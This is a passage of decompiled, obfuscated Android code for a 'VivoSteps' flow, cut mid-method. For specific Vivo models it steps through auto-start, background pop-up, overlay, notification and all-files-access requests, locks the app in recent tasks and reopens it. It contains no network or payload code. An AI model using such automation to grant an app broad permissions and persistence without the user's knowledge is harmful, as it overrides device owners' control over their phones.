                                                return Boolean.valueOf(i8 == 0);
                                            }
                                        }
                                    } else if (!"13.0".equals(str15) && "OriginOS Ocean".equals(str17) && AbstractC0779a1.m213656a9(str16, "V1955A")) {
                                        vivoSteps$execute$1.f54784a0 = c0371a84;
                                        vivoSteps$execute$1.f54785a1 = null;
                                        vivoSteps$execute$1.f54786a2 = null;
                                        vivoSteps$execute$1.f54787a3 = null;
                                        vivoSteps$execute$1.f54788a4 = null;
                                        vivoSteps$execute$1.f54789a5 = j3;
                                        vivoSteps$execute$1.f54790a6 = i3;
                                        vivoSteps$execute$1.f54794b0 = 9;
                                        objM212406c4 = c0371a84.m212405c3(str6, vivoSteps$execute$1);
                                        if (objM212406c4 != coroutineSingletons) {
                                            i5 = i3;
                                            j5 = j3;
                                            c0371a86 = c0371a84;
                                            if (!((Boolean) objM212406c4).booleanValue()) {
                                                i5 = 0;
                                            }
                                            long jCurrentTimeMillis3 = System.currentTimeMillis() - j5;
                                            t60.m214704c5(c0371a86.f55141a2, "[Vivo] V1955A特殊流程完成: " + (i5 == 0 ? str3 : str2) + ", 耗时: " + jCurrentTimeMillis3 + str20);
                                            return Boolean.valueOf(i5 == 0);
                                        }
                                    } else {
                                        VivoSteps$execute$2 vivoSteps$execute$2 = new VivoSteps$execute$2(c0371a84, str6, null);
                                        vivoSteps$execute$1.f54784a0 = c0371a84;
                                        vivoSteps$execute$1.f54785a1 = str6;
                                        vivoSteps$execute$1.f54786a2 = null;
                                        vivoSteps$execute$1.f54787a3 = null;
                                        vivoSteps$execute$1.f54788a4 = null;
                                        vivoSteps$execute$1.f54789a5 = j3;
                                        vivoSteps$execute$1.f54790a6 = i3;
                                        vivoSteps$execute$1.f54794b0 = 10;
                                        objM212406c4 = c0371a84.m212406c4(VivoSteps$FlowType.AUTO_START, str6, vivoSteps$execute$2, vivoSteps$execute$1);
                                        if (objM212406c4 != coroutineSingletons) {
                                            c0371a85 = c0371a84;
                                            str18 = str6;
                                            j4 = j3;
                                            if (!((Boolean) objM212406c4).booleanValue()) {
                                                i3 = 0;
                                            }
                                            VivoSteps$execute$3 vivoSteps$execute$3 = new VivoSteps$execute$3(c0371a85, str18, null);
                                            vivoSteps$execute$1.f54784a0 = c0371a85;
                                            vivoSteps$execute$1.f54785a1 = str18;
                                            vivoSteps$execute$1.f54789a5 = j4;
                                            vivoSteps$execute$1.f54790a6 = i3;
                                            vivoSteps$execute$1.f54794b0 = 11;
                                            objM212406c4 = c0371a85.m212406c4(VivoSteps$FlowType.BACKGROUND_POPUP, str18, vivoSteps$execute$3, vivoSteps$execute$1);
                                            if (objM212406c4 != coroutineSingletons) {
                                                if (!((Boolean) objM212406c4).booleanValue()) {
                                                    i3 = 0;
                                                }
                                                VivoSteps$execute$4 vivoSteps$execute$4 = new VivoSteps$execute$4(c0371a85, str18, null);
                                                vivoSteps$execute$1.f54784a0 = c0371a85;
                                                vivoSteps$execute$1.f54785a1 = str18;
                                                vivoSteps$execute$1.f54789a5 = j4;
                                                vivoSteps$execute$1.f54790a6 = i3;
                                                vivoSteps$execute$1.f54794b0 = 12;
                                                objM212406c4 = c0371a85.m212406c4(VivoSteps$FlowType.OVERLAY_PERMISSION, str18, vivoSteps$execute$4, vivoSteps$execute$1);
                                                if (objM212406c4 != coroutineSingletons) {
                                                    if (!((Boolean) objM212406c4).booleanValue()) {
                                                        i3 = 0;
                                                    }
                                                    VivoSteps$execute$5 vivoSteps$execute$5 = new VivoSteps$execute$5(c0371a85, str18, null);
                                                    vivoSteps$execute$1.f54784a0 = c0371a85;
                                                    vivoSteps$execute$1.f54785a1 = str18;
                                                    vivoSteps$execute$1.f54789a5 = j4;
                                                    vivoSteps$execute$1.f54790a6 = i3;
                                                    vivoSteps$execute$1.f54794b0 = 13;
                                                    objM212406c4 = c0371a85.m212406c4(VivoSteps$FlowType.NOTIFICATION, str18, vivoSteps$execute$5, vivoSteps$execute$1);
                                                    if (objM212406c4 != coroutineSingletons) {
                                                        if (!((Boolean) objM212406c4).booleanValue()) {
                                                            i3 = 0;
                                                        }
                                                        VivoSteps$execute$6 vivoSteps$execute$6 = new VivoSteps$execute$6(c0371a85, str18, null);
                                                        vivoSteps$execute$1.f54784a0 = c0371a85;
                                                        vivoSteps$execute$1.f54785a1 = null;
                                                        vivoSteps$execute$1.f54789a5 = j4;
                                                        vivoSteps$execute$1.f54790a6 = i3;
                                                        vivoSteps$execute$1.f54794b0 = 14;
                                                        objM212406c4 = c0371a85.m212406c4(VivoSteps$FlowType.ALL_FILES_ACCESS, str18, vivoSteps$execute$6, vivoSteps$execute$1);
                                                        if (objM212406c4 != coroutineSingletons) {
                                                            j9 = j4;
                                                            c0371a810 = c0371a85;
                                                            if (!((Boolean) objM212406c4).booleanValue()) {
                                                                i3 = 0;
                                                            }
                                                            t60.m214704c5(c0371a810.f55141a2, "[Vivo] 授权流程完成: ".concat(i3 == 0 ? str3 : str2));
                                                            if (c0371a810.f55142a3.m214991a6(vivoSteps$FlowType)) {
                                                                vivoSteps$execute$1.f54784a0 = c0371a810;
                                                                vivoSteps$execute$1.f54789a5 = j9;
                                                                vivoSteps$execute$1.f54790a6 = i3;
                                                                vivoSteps$execute$1.f54794b0 = 15;
                                                                objM212406c4 = c0371a810.m212409c7(vivoSteps$execute$1);
                                                                break;
                                                            } else {
                                                                String str25 = c0371a810.f55141a2;
                                                                context = c0371a810.f55140a1;
                                                                t60.m214704c5(str25, "[Vivo] 🔧 锁定完成，重新打开APP以便后续权限申请...");
                                                                try {
                                                                    intentM211757a1 = new C0328b3(context).m211757a1();
                                                                } catch (Exception e) {
                                                                    e = e;
                                                                    i9 = i3;
                                                                    j10 = j9;
                                                                    c0371a811 = c0371a810;
                                                                    tz0.m214807a7("[Vivo] ⚠️ 重新打开APP失败: ", e.getMessage(), c0371a811.f55141a2);
                                                                    c0371a810 = c0371a811;
                                                                    j9 = j10;
                                                                    i3 = i9;
                                                                    String str26 = c0371a810.f55141a2;
                                                                    long jCurrentTimeMillis4 = System.currentTimeMillis() - j9;
                                                                    long j12 = 60000;
                                                                    long j13 = 1000;
                                                                    t60.m214704c5(str26, str10);
                                                                    t60.m214704c5(str26, "║ 📊 Vivo授权流程执行完成");
                                                                    t60.m214704c5(str26, "╠════════════════════════════════════════════════════════════");
                                                                    t60.m214704c5(str26, "║ ⏱️ 总耗时: " + jCurrentTimeMillis4 + "ms (" + (jCurrentTimeMillis4 / j12) + "分" + ((jCurrentTimeMillis4 % j12) / j13) + "秒" + (jCurrentTimeMillis4 % j13) + "毫秒)");
                                                                    tz0.m214807a7("║ 📱 机型: ", Build.MODEL, str26);
                                                                    int i13 = Build.VERSION.SDK_INT;
                                                                    StringBuilder sb = new StringBuilder("║ 🤖 Android: ");
                                                                    sb.append(i13);
                                                                    t60.m214704c5(str26, sb.toString());
                                                                    t60.m214704c5(str26, "║ ✅ 结果: ".concat(i3 != 0 ? "全部成功" : "部分失败"));
                                                                    t60.m214704c5(str26, str5);
                                                                    return Boolean.valueOf(i3 != 0);
                                                                }
                                                                if (intentM211757a1 != null) {
                                                                    t60.m214726f4(c0371a810.f55141a2, "[Vivo] ⚠️ 无可用的启动 Activity，跳过重新打开APP");
                                                                    String str262 = c0371a810.f55141a2;
                                                                    long jCurrentTimeMillis42 = System.currentTimeMillis() - j9;
                                                                    long j122 = 60000;
                                                                    long j132 = 1000;
                                                                    t60.m214704c5(str262, str10);
                                                                    t60.m214704c5(str262, "║ 📊 Vivo授权流程执行完成");
                                                                    t60.m214704c5(str262, "╠════════════════════════════════════════════════════════════");
                                                                    t60.m214704c5(str262, "║ ⏱️ 总耗时: " + jCurrentTimeMillis42 + "ms (" + (jCurrentTimeMillis42 / j122) + "分" + ((jCurrentTimeMillis42 % j122) / j132) + "秒" + (jCurrentTimeMillis42 % j132) + "毫秒)");
                                                                    tz0.m214807a7("║ 📱 机型: ", Build.MODEL, str262);
                                                                    int i132 = Build.VERSION.SDK_INT;
                                                                    StringBuilder sb2 = new StringBuilder("║ 🤖 Android: ");
                                                                    sb2.append(i132);
                                                                    t60.m214704c5(str262, sb2.toString());
                                                                    t60.m214704c5(str262, "║ ✅ 结果: ".concat(i3 != 0 ? "全部成功" : "部分失败"));
                                                                    t60.m214704c5(str262, str5);
                                                                    return Boolean.valueOf(i3 != 0);
                                                                }
                                                                context.startActivity(intentM211757a1);
                                                                vivoSteps$execute$1.f54784a0 = c0371a810;
                                                                vivoSteps$execute$1.f54789a5 = j9;
                                                                vivoSteps$execute$1.f54790a6 = i3;
                                                                vivoSteps$execute$1.f54794b0 = 16;
                                                                if (b81.m210571b1(500L, vivoSteps$execute$1) != coroutineSingletons) {
                                                                    i9 = i3;
                                                                    j10 = j9;
                                                                    c0371a811 = c0371a810;
                                                                    try {
                                                                        t60.m214704c5(c0371a811.f55141a2, "[Vivo] ✅ APP已重新打开");
                                                                    } catch (Exception e2) {
                                                                        e = e2;
                                                                        tz0.m214807a7("[Vivo] ⚠️ 重新打开APP失败: ", e.getMessage(), c0371a811.f55141a2);
                                                                        c0371a810 = c0371a811;
                                                                        j9 = j10;
                                                                        i3 = i9;
                                                                        String str2622 = c0371a810.f55141a2;
                                                                        long jCurrentTimeMillis422 = System.currentTimeMillis() - j9;
                                                                        long j1222 = 60000;
                                                                        long j1322 = 1000;
                                                                        t60.m214704c5(str2622, str10);
                                                                        t60.m214704c5(str2622, "║ 📊 Vivo授权流程执行完成");
                                                                        t60.m214704c5(str2622, "╠════════════════════════════════════════════════════════════");
                                                                        t60.m214704c5(str2622, "║ ⏱️ 总耗时: " + jCurrentTimeMillis422 + "ms (" + (jCurrentTimeMillis422 / j1222) + "分" + ((jCurrentTimeMillis422 % j1222) / j1322) + "秒" + (jCurrentTimeMillis422 % j1322) + "毫秒)");
                                                                        tz0.m214807a7("║ 📱 机型: ", Build.MODEL, str2622);
                                                                        int i1322 = Build.VERSION.SDK_INT;
                                                                        StringBuilder sb22 = new StringBuilder("║ 🤖 Android: ");
                                                                        sb22.append(i1322);
                                                                        t60.m214704c5(str2622, sb22.toString());
                                                                        t60.m214704c5(str2622, "║ ✅ 结果: ".concat(i3 != 0 ? "全部成功" : "部分失败"));
                                                                        t60.m214704c5(str2622, str5);
                                                                        return Boolean.valueOf(i3 != 0);
                                                                    }
                                                                    c0371a810 = c0371a811;
                                                                    j9 = j10;
                                                                    i3 = i9;
                                                                    String str26222 = c0371a810.f55141a2;
                                                                    long jCurrentTimeMillis4222 = System.currentTimeMillis() - j9;
                                                                    long j12222 = 60000;
                                                                    long j13222 = 1000;
                                                                    t60.m214704c5(str26222, str10);
                                                                    t60.m214704c5(str26222, "║ 📊 Vivo授权流程执行完成");
                                                                    t60.m214704c5(str26222, "╠════════════════════════════════════════════════════════════");
                                                                    t60.m214704c5(str26222, "║ ⏱️ 总耗时: " + jCurrentTimeMillis4222 + "ms (" + (jCurrentTimeMillis4222 / j12222) + "分" + ((jCurrentTimeMillis4222 % j12222) / j13222) + "秒" + (jCurrentTimeMillis4222 % j13222) + "毫秒)");
                                                                    tz0.m214807a7("║ 📱 机型: ", Build.MODEL, str26222);
                                                                    int i13222 = Build.VERSION.SDK_INT;
                                                                    StringBuilder sb222 = new StringBuilder("║ 🤖 Android: ");
                                                                    sb222.append(i13222);
                                                                    t60.m214704c5(str26222, sb222.toString());
                                                                    t60.m214704c5(str26222, "║ ✅ 结果: ".concat(i3 != 0 ? "全部成功" : "部分失败"));
                                                                    t60.m214704c5(str26222, str5);
                                                                    return Boolean.valueOf(i3 != 0);
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                } else {
                                    vivoSteps$execute$1.f54784a0 = c0371a84;
                                    vivoSteps$execute$1.f54785a1 = str6;
                                    vivoSteps$execute$1.f54786a2 = null;
                                    vivoSteps$execute$1.f54787a3 = null;
                                    vivoSteps$execute$1.f54788a4 = null;
                                    vivoSteps$execute$1.f54789a5 = j3;
                                    vivoSteps$execute$1.f54790a6 = i3;
                                    vivoSteps$execute$1.f54794b0 = 4;
                                    objM212406c4 = c0371a84.m212402c0(str6, vivoSteps$execute$1);
                                    if (objM212406c4 != coroutineSingletons) {
                                        str19 = str6;
                                        c0371a87 = c0371a84;
                                        j7 = j3;
                                        if (!((Boolean) objM212406c4).booleanValue()) {
                                            i3 = 0;
                                        }
                                        vivoSteps$execute$1.f54784a0 = c0371a87;
                                        vivoSteps$execute$1.f54785a1 = str19;
                                        vivoSteps$execute$1.f54789a5 = j7;
                                        vivoSteps$execute$1.f54790a6 = i3;
                                        vivoSteps$execute$1.f54794b0 = 5;
                                        objM212406c4 = c0371a87.m212404c2(str19, vivoSteps$execute$1);
                                        if (objM212406c4 != coroutineSingletons) {
                                            int i14 = i3;
                                            String str27 = str19;
                                            j8 = j7;
                                            if (!((Boolean) objM212406c4).booleanValue()) {
                                                i14 = 0;
                                            }
                                            vivoSteps$execute$1.f54784a0 = c0371a87;
                                            vivoSteps$execute$1.f54785a1 = null;
                                            vivoSteps$execute$1.f54789a5 = j8;
                                            vivoSteps$execute$1.f54790a6 = i14;
                                            vivoSteps$execute$1.f54794b0 = 6;
                                            objM212406c4 = c0371a87.m212403c1(str27, vivoSteps$execute$1);
                                            if (objM212406c4 != coroutineSingletons) {
                                                i7 = i14;
                                                c0371a88 = c0371a87;
                                                if (!((Boolean) objM212406c4).booleanValue()) {
                                                    i7 = 0;
                                                }
                                                long jCurrentTimeMillis5 = System.currentTimeMillis() - j8;
                                                t60.m214704c5(c0371a88.f55141a2, "[Vivo] V2001A特殊流程完成: " + (i7 == 0 ? str3 : str2) + ", 耗时: " + jCurrentTimeMillis5 + str7);
                                                return Boolean.valueOf(i7 == 0);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                int i15 = vivoSteps$execute$1.f54791a7;
                int i16 = vivoSteps$execute$1.f54790a6;
                long j14 = vivoSteps$execute$1.f54789a5;
                String str28 = vivoSteps$execute$1.f54788a4;
                str11 = vivoSteps$execute$1.f54787a3;
                String str29 = vivoSteps$execute$1.f54786a2;
                str12 = vivoSteps$execute$1.f54785a1;
                C0371a8 c0371a812 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                c0371a82 = c0371a812;
                obj = objM212406c4;
                str2 = "⚠️部分失败";
                i = i16;
                j2 = j14;
                i2 = i15;
                str8 = str29;
                str3 = "✅全部成功";
                str4 = str28;
                str5 = "╚════════════════════════════════════════════════════════════";
                if (((Boolean) obj).booleanValue()) {
                }
                c0371a8 = c0371a82;
                str7 = "ms";
                str9 = str4;
                str6 = str12;
                str10 = "╔════════════════════════════════════════════════════════════";
                j = j2;
                strM212384e2 = str11;
                if (c0371a8.f55142a3.m214991a6(vivoSteps$FlowType2)) {
                }
                return coroutineSingletons;
            case 2:
                int i17 = vivoSteps$execute$1.f54791a7;
                int i18 = vivoSteps$execute$1.f54790a6;
                long j15 = vivoSteps$execute$1.f54789a5;
                str13 = vivoSteps$execute$1.f54788a4;
                String str30 = vivoSteps$execute$1.f54787a3;
                String str31 = vivoSteps$execute$1.f54786a2;
                str14 = vivoSteps$execute$1.f54785a1;
                C0371a8 c0371a813 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                c0371a83 = c0371a813;
                obj2 = objM212406c4;
                str2 = "⚠️部分失败";
                i = i18;
                strM212384e2 = str30;
                str5 = "╚════════════════════════════════════════════════════════════";
                str8 = str31;
                str7 = "ms";
                i2 = i17;
                str3 = "✅全部成功";
                str10 = "╔════════════════════════════════════════════════════════════";
                j = j15;
                if (((Boolean) obj2).booleanValue()) {
                }
                c0371a8 = c0371a83;
                str9 = str13;
                str6 = str14;
                int i1222 = i;
                vivoSteps$execute$1.f54784a0 = c0371a8;
                vivoSteps$execute$1.f54785a1 = str6;
                vivoSteps$execute$1.f54786a2 = str8;
                vivoSteps$execute$1.f54787a3 = strM212384e2;
                vivoSteps$execute$1.f54788a4 = str9;
                vivoSteps$execute$1.f54789a5 = j;
                vivoSteps$execute$1.f54790a6 = i1222;
                vivoSteps$execute$1.f54791a7 = i2;
                vivoSteps$execute$1.f54794b0 = 3;
                c0371a84 = c0371a8;
                String str2222 = str9;
                String str2322 = strM212384e2;
                if (b81.m210571b1(500L, vivoSteps$execute$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                i3 = vivoSteps$execute$1.f54791a7;
                int i19 = vivoSteps$execute$1.f54790a6;
                j3 = vivoSteps$execute$1.f54789a5;
                str16 = vivoSteps$execute$1.f54788a4;
                String str32 = vivoSteps$execute$1.f54787a3;
                String str33 = vivoSteps$execute$1.f54786a2;
                String str34 = vivoSteps$execute$1.f54785a1;
                C0371a8 c0371a814 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                c0371a84 = c0371a814;
                str15 = str33;
                str3 = "✅全部成功";
                str10 = "╔════════════════════════════════════════════════════════════";
                i4 = i19;
                str5 = "╚════════════════════════════════════════════════════════════";
                str6 = str34;
                str17 = str32;
                str7 = "ms";
                str2 = "⚠️部分失败";
                if (i4 <= 33) {
                    str20 = str7;
                    if (i4 != 29) {
                        if (!"13.0".equals(str15)) {
                            VivoSteps$execute$2 vivoSteps$execute$22 = new VivoSteps$execute$2(c0371a84, str6, null);
                            vivoSteps$execute$1.f54784a0 = c0371a84;
                            vivoSteps$execute$1.f54785a1 = str6;
                            vivoSteps$execute$1.f54786a2 = null;
                            vivoSteps$execute$1.f54787a3 = null;
                            vivoSteps$execute$1.f54788a4 = null;
                            vivoSteps$execute$1.f54789a5 = j3;
                            vivoSteps$execute$1.f54790a6 = i3;
                            vivoSteps$execute$1.f54794b0 = 10;
                            objM212406c4 = c0371a84.m212406c4(VivoSteps$FlowType.AUTO_START, str6, vivoSteps$execute$22, vivoSteps$execute$1);
                            if (objM212406c4 != coroutineSingletons) {
                            }
                            return coroutineSingletons;
                        }
                        break;
                    }
                    break;
                }
                String str262222 = c0371a810.f55141a2;
                long jCurrentTimeMillis42222 = System.currentTimeMillis() - j9;
                long j122222 = 60000;
                long j132222 = 1000;
                t60.m214704c5(str262222, str10);
                t60.m214704c5(str262222, "║ 📊 Vivo授权流程执行完成");
                t60.m214704c5(str262222, "╠════════════════════════════════════════════════════════════");
                t60.m214704c5(str262222, "║ ⏱️ 总耗时: " + jCurrentTimeMillis42222 + "ms (" + (jCurrentTimeMillis42222 / j122222) + "分" + ((jCurrentTimeMillis42222 % j122222) / j132222) + "秒" + (jCurrentTimeMillis42222 % j132222) + "毫秒)");
                tz0.m214807a7("║ 📱 机型: ", Build.MODEL, str262222);
                int i132222 = Build.VERSION.SDK_INT;
                StringBuilder sb2222 = new StringBuilder("║ 🤖 Android: ");
                sb2222.append(i132222);
                t60.m214704c5(str262222, sb2222.toString());
                t60.m214704c5(str262222, "║ ✅ 结果: ".concat(i3 != 0 ? "全部成功" : "部分失败"));
                t60.m214704c5(str262222, str5);
                return Boolean.valueOf(i3 != 0);
            case 4:
                i3 = vivoSteps$execute$1.f54790a6;
                j7 = vivoSteps$execute$1.f54789a5;
                str19 = vivoSteps$execute$1.f54785a1;
                c0371a87 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str7 = "ms";
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                vivoSteps$execute$1.f54784a0 = c0371a87;
                vivoSteps$execute$1.f54785a1 = str19;
                vivoSteps$execute$1.f54789a5 = j7;
                vivoSteps$execute$1.f54790a6 = i3;
                vivoSteps$execute$1.f54794b0 = 5;
                objM212406c4 = c0371a87.m212404c2(str19, vivoSteps$execute$1);
                if (objM212406c4 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                i3 = vivoSteps$execute$1.f54790a6;
                j7 = vivoSteps$execute$1.f54789a5;
                str19 = vivoSteps$execute$1.f54785a1;
                c0371a87 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str7 = "ms";
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                int i142 = i3;
                String str272 = str19;
                j8 = j7;
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                vivoSteps$execute$1.f54784a0 = c0371a87;
                vivoSteps$execute$1.f54785a1 = null;
                vivoSteps$execute$1.f54789a5 = j8;
                vivoSteps$execute$1.f54790a6 = i142;
                vivoSteps$execute$1.f54794b0 = 6;
                objM212406c4 = c0371a87.m212403c1(str272, vivoSteps$execute$1);
                if (objM212406c4 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                i7 = vivoSteps$execute$1.f54790a6;
                j8 = vivoSteps$execute$1.f54789a5;
                c0371a88 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str7 = "ms";
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                long jCurrentTimeMillis52 = System.currentTimeMillis() - j8;
                if (i7 == 0) {
                }
                t60.m214704c5(c0371a88.f55141a2, "[Vivo] V2001A特殊流程完成: " + (i7 == 0 ? str3 : str2) + ", 耗时: " + jCurrentTimeMillis52 + str7);
                return Boolean.valueOf(i7 == 0);
            case 7:
                int i20 = vivoSteps$execute$1.f54790a6;
                long j16 = vivoSteps$execute$1.f54789a5;
                String str35 = vivoSteps$execute$1.f54785a1;
                C0371a8 c0371a815 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                i6 = i20;
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                str6 = str35;
                j6 = j16;
                c0371a84 = c0371a815;
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                vivoSteps$execute$1.f54784a0 = c0371a84;
                vivoSteps$execute$1.f54785a1 = null;
                vivoSteps$execute$1.f54789a5 = j6;
                vivoSteps$execute$1.f54790a6 = i6;
                vivoSteps$execute$1.f54794b0 = 8;
                objM212406c4 = c0371a84.m212403c1(str6, vivoSteps$execute$1);
                if (objM212406c4 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                i8 = vivoSteps$execute$1.f54790a6;
                j6 = vivoSteps$execute$1.f54789a5;
                c0371a89 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                long jCurrentTimeMillis22 = System.currentTimeMillis() - j6;
                if (i8 == 0) {
                }
                t60.m214704c5(c0371a89.f55141a2, "[Vivo] V1962A特殊流程完成: " + (i8 == 0 ? str3 : str2) + ", 耗时: " + jCurrentTimeMillis22 + str20);
                return Boolean.valueOf(i8 == 0);
            case 9:
                i5 = vivoSteps$execute$1.f54790a6;
                j5 = vivoSteps$execute$1.f54789a5;
                c0371a86 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                long jCurrentTimeMillis32 = System.currentTimeMillis() - j5;
                if (i5 == 0) {
                }
                t60.m214704c5(c0371a86.f55141a2, "[Vivo] V1955A特殊流程完成: " + (i5 == 0 ? str3 : str2) + ", 耗时: " + jCurrentTimeMillis32 + str20);
                return Boolean.valueOf(i5 == 0);
            case 10:
                i3 = vivoSteps$execute$1.f54790a6;
                j4 = vivoSteps$execute$1.f54789a5;
                str18 = vivoSteps$execute$1.f54785a1;
                c0371a85 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str5 = "╚════════════════════════════════════════════════════════════";
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                str10 = "╔════════════════════════════════════════════════════════════";
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                VivoSteps$execute$3 vivoSteps$execute$32 = new VivoSteps$execute$3(c0371a85, str18, null);
                vivoSteps$execute$1.f54784a0 = c0371a85;
                vivoSteps$execute$1.f54785a1 = str18;
                vivoSteps$execute$1.f54789a5 = j4;
                vivoSteps$execute$1.f54790a6 = i3;
                vivoSteps$execute$1.f54794b0 = 11;
                objM212406c4 = c0371a85.m212406c4(VivoSteps$FlowType.BACKGROUND_POPUP, str18, vivoSteps$execute$32, vivoSteps$execute$1);
                if (objM212406c4 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                i3 = vivoSteps$execute$1.f54790a6;
                j4 = vivoSteps$execute$1.f54789a5;
                str18 = vivoSteps$execute$1.f54785a1;
                c0371a85 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str5 = "╚════════════════════════════════════════════════════════════";
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                str10 = "╔════════════════════════════════════════════════════════════";
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                VivoSteps$execute$4 vivoSteps$execute$42 = new VivoSteps$execute$4(c0371a85, str18, null);
                vivoSteps$execute$1.f54784a0 = c0371a85;
                vivoSteps$execute$1.f54785a1 = str18;
                vivoSteps$execute$1.f54789a5 = j4;
                vivoSteps$execute$1.f54790a6 = i3;
                vivoSteps$execute$1.f54794b0 = 12;
                objM212406c4 = c0371a85.m212406c4(VivoSteps$FlowType.OVERLAY_PERMISSION, str18, vivoSteps$execute$42, vivoSteps$execute$1);
                if (objM212406c4 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                i3 = vivoSteps$execute$1.f54790a6;
                j4 = vivoSteps$execute$1.f54789a5;
                str18 = vivoSteps$execute$1.f54785a1;
                c0371a85 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str5 = "╚════════════════════════════════════════════════════════════";
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                str10 = "╔════════════════════════════════════════════════════════════";
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                VivoSteps$execute$5 vivoSteps$execute$52 = new VivoSteps$execute$5(c0371a85, str18, null);
                vivoSteps$execute$1.f54784a0 = c0371a85;
                vivoSteps$execute$1.f54785a1 = str18;
                vivoSteps$execute$1.f54789a5 = j4;
                vivoSteps$execute$1.f54790a6 = i3;
                vivoSteps$execute$1.f54794b0 = 13;
                objM212406c4 = c0371a85.m212406c4(VivoSteps$FlowType.NOTIFICATION, str18, vivoSteps$execute$52, vivoSteps$execute$1);
                if (objM212406c4 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 13:
                i3 = vivoSteps$execute$1.f54790a6;
                j4 = vivoSteps$execute$1.f54789a5;
                str18 = vivoSteps$execute$1.f54785a1;
                c0371a85 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str5 = "╚════════════════════════════════════════════════════════════";
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                str10 = "╔════════════════════════════════════════════════════════════";
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                VivoSteps$execute$6 vivoSteps$execute$62 = new VivoSteps$execute$6(c0371a85, str18, null);
                vivoSteps$execute$1.f54784a0 = c0371a85;
                vivoSteps$execute$1.f54785a1 = null;
                vivoSteps$execute$1.f54789a5 = j4;
                vivoSteps$execute$1.f54790a6 = i3;
                vivoSteps$execute$1.f54794b0 = 14;
                objM212406c4 = c0371a85.m212406c4(VivoSteps$FlowType.ALL_FILES_ACCESS, str18, vivoSteps$execute$62, vivoSteps$execute$1);
                if (objM212406c4 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                i3 = vivoSteps$execute$1.f54790a6;
                j9 = vivoSteps$execute$1.f54789a5;
                c0371a810 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str5 = "╚════════════════════════════════════════════════════════════";
                str2 = "⚠️部分失败";
                str3 = "✅全部成功";
                str10 = "╔════════════════════════════════════════════════════════════";
                if (!((Boolean) objM212406c4).booleanValue()) {
                }
                t60.m214704c5(c0371a810.f55141a2, "[Vivo] 授权流程完成: ".concat(i3 == 0 ? str3 : str2));
                if (c0371a810.f55142a3.m214991a6(vivoSteps$FlowType)) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                i3 = vivoSteps$execute$1.f54790a6;
                j9 = vivoSteps$execute$1.f54789a5;
                c0371a810 = vivoSteps$execute$1.f54784a0;
                kg1.m213544f4(objM212406c4);
                str5 = "╚════════════════════════════════════════════════════════════";
                str10 = "╔════════════════════════════════════════════════════════════";
                if (((Boolean) objM212406c4).booleanValue()) {
                    c0371a810.f55142a3.m214997b2(vivoSteps$FlowType);
                } else {
                    t60.m214726f4(c0371a810.f55141a2, "[Vivo] ⚠️ 最近任务锁定失败");
                }
                String str252 = c0371a810.f55141a2;
                context = c0371a810.f55140a1;
                t60.m214704c5(str252, "[Vivo] 🔧 锁定完成，重新打开APP以便后续权限申请...");
                intentM211757a1 = new C0328b3(context).m211757a1();
                if (intentM211757a1 != null) {
                }
                break;
            case 16:
                i9 = vivoSteps$execute$1.f54790a6;
                j10 = vivoSteps$execute$1.f54789a5;
                c0371a811 = vivoSteps$execute$1.f54784a0;
                try {
                    kg1.m213544f4(objM212406c4);
                    str5 = "╚════════════════════════════════════════════════════════════";
                    str10 = "╔════════════════════════════════════════════════════════════";
                    t60.m214704c5(c0371a811.f55141a2, "[Vivo] ✅ APP已重新打开");
                } catch (Exception e3) {
                    e = e3;
                    str5 = "╚════════════════════════════════════════════════════════════";
                    str10 = "╔════════════════════════════════════════════════════════════";
                    tz0.m214807a7("[Vivo] ⚠️ 重新打开APP失败: ", e.getMessage(), c0371a811.f55141a2);
                    c0371a810 = c0371a811;
                    j9 = j10;
                    i3 = i9;
